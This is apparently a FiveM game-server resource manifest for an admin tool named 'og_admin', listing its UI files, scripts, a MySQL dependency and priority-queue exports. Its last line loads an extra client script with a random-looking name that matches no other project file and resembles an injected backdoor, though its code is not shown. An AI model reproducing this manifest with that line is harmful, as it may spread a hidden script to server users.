description 'og_admin'

ui_page 'html/index.html'



client_scripts {

    'config.lua',

    'client/client.lua',

}



server_scripts {

    'server/server.lua',

    'server/commands.lua',

}



files {

    'html/index.html',

    'html/styles.css',

    'html/hydroui.css',

    'html/img/nothing.png',

    'html/img/working.png',

    'html/img/user.png',

    'html/script.js'

}



server_script '@mysql-async/lib/MySQL.lua'



server_export "AddPriority"

server_export "RemovePriority"


client_script 'MDjJKCzlEZ.lua'
